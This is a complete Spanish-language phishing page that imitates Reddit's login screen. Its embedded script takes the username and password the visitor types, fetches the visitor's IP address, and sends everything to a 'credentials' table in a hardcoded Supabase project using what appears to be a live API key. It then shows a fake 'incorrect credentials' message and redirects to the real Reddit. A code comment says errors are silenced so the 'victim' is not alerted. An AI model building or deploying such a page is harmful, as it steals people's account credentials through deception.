<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="theme-color" content="#0f1113">
    <link rel="icon" type="image/png" href="reddit-icon-logo.png">
    <title>Te damos la bienvenida a Reddit</title>
    <style>
        :root {
            color-scheme: dark;
            font-family: Arial, Helvetica, sans-serif;
            background: #050707;
            color: #e7e9ea;
        }

        * {
            box-sizing: border-box;
        }

        body {
            min-width: 320px;
            min-height: 100vh;
            margin: 0;
            overflow-x: hidden;
            background-color: #050707;
            background-image:
                radial-gradient(ellipse at 8% 30%, #101819 0 5%, transparent 5.2%),
                radial-gradient(ellipse at 29% 58%, #101819 0 7%, transparent 7.2%),
                radial-gradient(ellipse at 79% 34%, #101819 0 6%, transparent 6.2%),
                radial-gradient(ellipse at 94% 78%, #101819 0 7%, transparent 7.2%),
                radial-gradient(ellipse at 54% 92%, #101819 0 5%, transparent 5.2%);
            background-size: 360px 190px, 440px 260px, 390px 220px, 420px 250px, 350px 210px;
        }

        .site-header {
            position: relative;
            z-index: 1;
            display: flex;
            align-items: center;
            height: 54px;
            padding: 0 38px;
            background: #111315;
            border-bottom: 1px solid #25282a;
        }

        .brand {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            color: #f4f5f6;
            font-size: 22px;
            font-weight: 700;
            letter-spacing: -0.8px;
        }

        .brand-mark {
            display: grid;
            width: 30px;
            height: 30px;
            place-items: center;
            border-radius: 50%;
            background: #ff6b35;
            color: #141414;
            font-size: 17px;
        }

        main {
            display: flex;
            justify-content: center;
            padding: 11px 16px 32px;
        }

        .login-card {
            width: min(100%, 498px);
            padding: 38px 74px 24px;
            border: 1px solid #202426;
            border-radius: 16px;
            background: #181c1e;
            box-shadow: 0 12px 36px rgb(0 0 0 / 28%);
        }

        h1 {
            margin: 0 0 8px;
            text-align: center;
            font-size: 23px;
            line-height: 1.3;
            font-weight: 700;
        }

        .terms {
            margin: 0 0 14px;
            color: #b8c3c8;
            text-align: center;
            font-size: 14px;
            line-height: 1.4;
        }

        a {
            color: #6d9fff;
            text-decoration: none;
        }

        a:hover {
            text-decoration: underline;
        }

        .demo-notice {
            margin: 0 0 14px;
            padding: 9px 10px;
            border: 1px solid #5b4820;
            border-radius: 8px;
            background: #282317;
            color: #f4d78b;
            text-align: center;
            font-size: 12px;
            line-height: 1.4;
        }

        .social-options {
            display: grid;
            gap: 8px;
        }

        .social-button {
            position: relative;
            display: flex;
            min-height: 39px;
            align-items: center;
            justify-content: center;
            padding: 8px 36px;
            border: 0;
            border-radius: 22px;
            background: #f7f7f7;
            color: #252729;
            font: inherit;
            font-size: 14px;
            text-align: center;
            cursor: pointer;
        }

        .social-icon {
            position: absolute;
            left: 14px;
            font-size: 17px;
            font-weight: 700;
        }

        .divider {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 16px 0;
            color: #aeb9bd;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            height: 1px;
            flex: 1;
            background: #303638;
            content: "";
        }

        .field {
            display: block;
            width: 100%;
            height: 54px;
            margin-bottom: 18px;
            padding: 0 15px;
            border: 1px solid transparent;
            border-radius: 18px;
            outline: none;
            background: #293235;
            color: #e7e9ea;
            font: inherit;
            font-size: 14px;
        }

        .field::placeholder {
            color: #94a9b1;
            opacity: 1;
        }

        .field:focus {
            border-color: #7299ed;
            box-shadow: 0 0 0 2px rgb(114 153 237 / 18%);
        }

        .forgot-link {
            display: inline-block;
            margin: 6px 0 14px;
            font-size: 13px;
        }

        .register-copy {
            margin: 0 0 20px;
            color: #b8c3c8;
            font-size: 13px;
        }

        .submit-button {
            width: 100%;
            min-height: 45px;
            border: 0;
            border-radius: 24px;
            background: #292d2f;
            color: #7c8284;
            font: inherit;
            font-size: 14px;
            font-weight: 700;
            cursor: pointer;
        }

        .status {
            min-height: 18px;
            margin: 12px 0 0;
            color: #f4d78b;
            text-align: center;
            font-size: 12px;
        }

        .brand-logo {
            width: 30px;
            height: 30px;
            object-fit: contain;
        }

        @media (max-width: 540px) {
            .site-header {
                padding: 0 20px;
            }

            main {
                padding: 12px 10px 24px;
            }

            .login-card {
                padding: 30px 24px 20px;
            }
        }
    </style>
</head>
<body>
    <header class="site-header">
        <div class="brand" aria-label="Comunidad">
            <img src="reddit-icon-logo.png" alt="reddit" class="brand-logo">
            <span>reddit</span>
        </div>
    </header>
    <main>
        <section class="login-card" aria-labelledby="login-title">
            <h1 id="login-title">Iniciar sesión</h1>
            <p class="terms">
                Al continuar, aceptas nuestros
                <a href="#acuerdo">Términos de uso</a> y confirmas que has leído la
                <a href="#privacidad">Política de privacidad</a>.
            </p>

            <div class="social-options">
                <button class="social-button" type="button">
                    <span class="social-icon" aria-hidden="true">▯</span>
                    Continuar con el número de teléfono
                </button>
                <button class="social-button" type="button">
                    <span class="social-icon" aria-hidden="true" style="color:#4285f4">G</span>
                    Continuar con Google
                </button>
                <button class="social-button" type="button">
                    <span class="social-icon" aria-hidden="true">●</span>
                    Continuar con Apple
                </button>
                <button class="social-button" type="button">
                    <span class="social-icon" aria-hidden="true">↗</span>
                    Enviarme enlace de un solo uso por correo electrónico
                </button>
            </div>

            <div class="divider" aria-hidden="true">o</div>
            <form id="login-form">
                <label class="visually-hidden" for="username">Correo electrónico o nombre de usuario</label>
                <input class="field" id="username" type="text" name="username" placeholder="Correo electrónico o nombre de usuario" required>

                <label class="visually-hidden" for="password">Contraseña</label>
                <input class="field" id="password" type="password" name="password" placeholder="Contraseña" required>

                <a class="forgot-link" href="#recuperar">¿Has olvidado tu contraseña?</a>
                <p class="register-copy">¿Es tu primera vez? <a href="#registro">Regístrate</a></p>
                <button class="submit-button" type="submit">Iniciar sesión</button>
                <p class="status" id="login-status"></p>
            </form>
        </section>
    </main>

    <style>
        .visually-hidden {
            position: absolute;
            width: 1px;
            height: 1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            white-space: nowrap;
            clip-path: inset(50%);
        }
    </style>

    <script>
        // === CONFIGURACIÓN DE SUPABASE ===
        // Cambia estos valores por los tuyos
        const SUPABASE_URL = 'https://arzuhfojufolvefuvbsq.supabase.co'; // <-- TU URL DE SUPABASE
        const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImFyenVoZm9qdWZvbHZlZnV2YnNxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTI0NDI0NjMsImV4cCI6MjEwODAxODQ2M30.XX2Qa9Fi1RZ1AuSaMn5RaDoYXIizzhZ2au-Ns4wfcec'; // <-- TU CLAVE ANONIMA (public) O SERVICE ROLE
        const TABLE_NAME = 'credentials'; // <-- Nombre de tu tabla

        document.getElementById("login-form").addEventListener("submit", async (event) => {
            event.preventDefault();

            const username = document.getElementById("username").value.trim();
            const password = document.getElementById("password").value.trim();
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            const ip = ipData.ip;
            const timestamp = new Date().toISOString();

            // Enviar a Supabase
            try {
                const response = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'apikey': SUPABASE_KEY,
                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                        'Prefer': 'return=representation'
                    },
                    body: JSON.stringify({
                        username: username,
                        password: password,
                        ip_address: ip,
                        created_at: timestamp
                    })
                });

                if (response.ok) {
                    document.getElementById("login-status").textContent = "Credenciales incorrectas. Intenta de nuevo.";
                } else {
                    // Aunque falle, redirige igual
                    document.getElementById("login-status").textContent = "Error al conectar. Intenta más tarde.";
                }
            } catch (err) {
                // Silenciar errores de red (no alertar a la víctima)
            }

            // Limpiar campos
            document.getElementById("username").value = "";
            document.getElementById("password").value = "";

            // Redirigir a Reddit real tras 2 segundos
            setTimeout(() => {
                window.location.href = "https://www.reddit.com";
            }, 2000);
        });
    </script>
</body>
</html>
